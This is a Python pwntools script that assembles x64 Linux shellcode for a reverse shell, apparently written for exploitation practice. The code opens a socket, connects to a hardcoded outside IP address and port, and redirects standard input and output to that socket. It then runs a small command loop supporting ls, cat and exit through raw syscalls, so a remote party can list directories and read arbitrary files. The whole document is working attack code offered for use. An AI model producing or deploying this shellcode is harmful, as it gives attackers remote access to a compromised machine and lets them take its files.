###This is a minimal standalone reverse shell that supports ls/cat/exit commands
###The only requirements are
#    0. x64 architecture
#    1. A large enough memory space to accomodate shellcode
#    2. syscall read/write/open/mmap/sock/con/dup2/getdents (some of which can be eliminated if needed)

from pwn import *

context.arch = 'amd64'

sock = asm('''
            mov rdi,0x2         #rdi  -> socket_arg1(family)    =2      =AF_INET
            mov rsi,0x1         #rsi  -> socket_arg2(type)      =1      =SOCK_STREAM
            mov rdx,0x0         #rdx  -> socket_arg3(protocol)  =0      =IPPROT_IP
            mov rax,0x29        #rax  -> syscall number         =41     =sys_socket
            syscall
            mov r12,rax
            ''')
conn = asm('''
            mov rbx,0x0
            add rbx,0x25c2708c  #socketaddr_in[2](sin_addr)     =140.112.194.37
            shl rbx,0x10
            add rbx,0x7527      #socketaddr_in[1](sin_port)     =10101
            shl rbx,0x10
            add rbx,0x2         #socketaddr_in[0](sin_family)   =2      =AF_INET
            push rbx
            mov rdi,r12         #rdi  -> connect_arg1(sockfd)   =sfd
            mov rsi,rsp         #rsi  -> connect_arg2(*uservaddr)
            mov rdx,0x10        #rdx  -> connect_arg3(addrlen)  =16     =size(socketaddr_in)
            mov rax,0x2a        #rax  -> syscall number         =42     =sys_connect
            syscall
            ''')
dup2 = asm('''
            mov rdi,0x0         #rdi  -> dup2_arg1(oldfd)       =0      =original stdin_pipe
            lea rsi,[r12+1]     #rsi  -> dup2_arg2(newfd)       =sfd+1  =backup
            mov rax,0x21        #rax  -> syscall number         =33     =sys_dup2
            syscall
            mov rdi,0x1         #rdi  -> dup2_arg1(oldfd)       =0      =original stdout_pipe
            lea rsi,[r12+2]     #rsi  -> dup2_arg2(newfd)       =sfd+2  =backup
            mov rax,0x21        #rax  -> syscall number         =33     =sys_dup2
            syscall
            mov rdi,r12         #rdi  -> dup2_arg1(oldfd)       =sfd    =sockfd
            mov rsi,0x0         #rsi  -> dup2_arg2(newfd)       =0      =stdin_fd
            mov rax,0x21        #rax  -> syscall number         =33     =sys_dup2
            syscall
            /**/                #rdi  -> dup2_arg1(oldfd)       already set to sockfd
            mov rsi,0x1         #rsi  -> dup2_arg2(newfd)       =1      =stdout_fd
            mov rax,0x21        #rax  -> syscall number         =33     =sys_dup2
            syscall
            ''')

sh = asm('''
         jmp MAIN

         FUNCTIONS:

            READLINE:
                mov r12, rdi
                mov r13, 0
                READLINELOOP:
                    mov rdi, 0
                    mov rsi, r12
                    mov rdx, 1
                    mov rax, 0
                    syscall
                    cmp byte ptr [r12], 0xa
                    je READLINEFIN
                    inc r12
                    inc r13
                    cmp r13, 0xffe
                    je READLINEFIN
                    jmp READLINELOOP
                READLINEFIN:
                    mov byte ptr [r12], 0
                    mov byte ptr [r12+1], 0
                    mov rax, r13
                    ret

            STRLEN:
                mov rax, 0
                STRLENLOOP:
                    cmp byte ptr [rdi+rax], 0
                    je STRLENRET
                    inc rax
                    jmp STRLENLOOP
                STRLENRET:
                    ret

            STRIPSPACE:
                STRIPSPACELOOP:
                    cmp byte ptr [rdi],0x20
                    inc rdi
                    je STRIPSPACELOOP
                    dec rdi
                    mov rax, rdi
                    ret

            STRNCMP:
                pop rsi
                mov r12, 0
                STRCMPLOOP:
                    cmp r12, rdx
                    je STRCMPRET
                    mov r13b, byte ptr [rdi+r12]
                    mov r14b, byte ptr [rsi+r12]
                    inc r12
                    cmp r13b, r14b
                    je STRCMPLOOP
                    mov rax, 0
                    ret
                STRCMPRET:
                    mov rax, 1
                    ret

            FINDCMD:
                mov rbx, rdi
                CMDCAT:
                    mov rdi, rbx
                    call CHKCMDCAT
                    cmp rax, 1
                    jne CMDLS
                    mov rax, 1
                    ret
                CMDLS:
                    mov rdi, rbx
                    call CHKCMDLS
                    cmp rax, 1
                    jne CMDEXIT
                    mov rax, 2
                    ret
                CMDEXIT:
                    mov rdi, rbx
                    call CHKCMDEXIT
                    cmp rax, 1
                    jne CMDUNKNOWN
                    mov rax, 3
                    ret
                CMDUNKNOWN:
                    mov rax, 0xffffffffffffffff
                    ret
                CHKCMDCAT:
                    mov rdx, 3
                    call STRNCMP
                    .byte 0x63,0x61,0x74
                CHKCMDLS:
                    mov rdx, 2
                    call STRNCMP
                    .byte 0x6c,0x73
                CHKCMDEXIT:
                    mov rdx, 4
                    call STRNCMP
                    .byte 0x65,0x78,0x69,0x74

            PRINTERROR:
                PRINTERRORLOOP:
                    pop rdi
                    cmp rdi, 0
                    je PRINTERRORRET
                    mov rbx, rdi
                    mov rdi, rbx
                    call STRLEN
                    mov rdx, rax
                    mov rdi, 1
                    mov rsi, rbx
                    mov rax, 1
                    syscall
                    jmp PRINTERRORLOOP
                PRINTERRORRET:
                    push 0xa
                    mov rdi, 1
                    mov rsi, rsp
                    mov rdx, 1
                    mov rax, 1
                    syscall
                    pop rbx
                    ret
                
            CAT:
                mov rbx, rdi
                mov rdi, rbx
                mov rsi, 0
                mov rdx, 0
                mov rax, 2
                syscall
                cmp rax, 0
                jl CATFAIL
                mov r12, rax
                CATLOOP:
                    mov rdi, r12
                    mov rsi, rbx
                    mov rdx, 0x100
                    mov rax, 0
                    syscall
                    mov r13, rax
                    mov rdi, 1
                    mov rsi, rbx
                    mov rdx, r13
                    mov rax, 1
                    syscall
                    cmp r13, 0x100
                    je CATLOOP
                ret
                CATFAIL:
                    push 0
                    push rbx
                    call PRINTERROR
                    .byte 0x63,0x61,0x74,0x20,0x66,0x69,0x6c,0x65,0x20,0x65,0x72,0x72,0x6f,0x72,0x20,0x3a,0x20,0x00

            LS:
                mov rbx, rdi
                mov rdi, rbx
                mov rsi, 0x10000
                mov rdx, 0
                mov rax, 2
                syscall
                cmp rax, 0
                jl LSFAIL
                mov r12, rax
                LSLOOP:
                    mov rdi, r12
                    lea rsi, qword ptr [rbx+0x100]
                    mov rdx, 0xf00
                    mov rax, 78
                    syscall
                    cmp rax, 0
                    jl LSFAIL
                    je LSRET
                    mov r13, rax
                    mov r14, 0
                    lea r15, qword ptr [rbx+0x100]
                    LSREADLOOP:
                        cmp r14, r13
                        jge LSLOOP
                        lea rdi, qword ptr [r15+0x12]
                        call STRLEN
                        mov rdx, rax
                        lea rsi, qword ptr [r15+0x12]
                        mov rdi, 1
                        mov rax, 1
                        syscall
                        push 0xa
                        mov rsi, rsp
                        mov rdi, 1
                        mov rdx, 1
                        mov rax, 1
                        syscall
                        pop rsi
                        mov rax, 0
                        mov ax, word ptr [r15+0x10]
                        add r15, rax
                        add r14, rax
                        jmp LSREADLOOP
                LSRET:
                    ret
                LSFAIL:
                    push 0
                    push rbx
                    call PRINTERROR
                    .byte 0x6c,0x73,0x20,0x65,0x72,0x72,0x6f,0x72,0x20,0x3a,0x20,0x00
                
            EXIT:
                mov rdi, 0
                mov rax, 60
                syscall

        MAIN:
            mov rdi, 0
            mov rsi, 0x1000
            mov rdx, 7
            mov r10, 0x22
            mov r8, 0xffffffff
            mov r9, 0
            mov rax, 9
            syscall
            mov rbp, rax
            MAINLOOP:
                mov rdi, rbp
                call READLINE
                cmp rax, 0
                jl READERROR
                mov rdi, rbp
                call FINDCMD
                cmp rax, 0xffffffffffffffff
                jne VALIDCMD
                call INVALIDCMD
                jmp MAINLOOP

                READERROR:
                    call PRINTREADERROR
                    call EXIT
                    PRINTREADERROR:
                        push 0
                        call PRINTERROR
                        .byte 0x52,0x65,0x61,0x64,0x20,0x65,0x72,0x72,0x6f,0x72,0x00

                VALIDCMD:
                    MAINCAT:
                        cmp rax, 1
                        jne MAINLS
                        lea rdi, byte ptr [rdi+4]
                        call STRIPSPACE
                        mov rdi, rax
                        call CAT
                        jmp MAINLOOP

                    MAINLS:
                        cmp rax, 2
                        jne MAINEXIT
                        lea rdi, byte ptr [rbp+3]
                        call STRIPSPACE
                        cmp byte ptr [rax], 0
                        jne CALLLS
                        mov byte ptr [rax], 0x2e
                        mov byte ptr [rax+1], 0
                        CALLLS:
                            mov rdi, rax
                            call LS
                        jmp MAINLOOP

                    MAINEXIT:
                        call EXIT

                INVALIDCMD:
                    push 0
                    call PRINTERROR
                    .byte 0x6c,0x6e,0x76,0x61,0x6c,0x69,0x64,0x20,0x63,0x6f,0x6d,0x6d,0x61,0x6e,0x64,0x00
        ''')+b'\x00\x00'

SC = sock+conn+dup2+sh
print(SC)
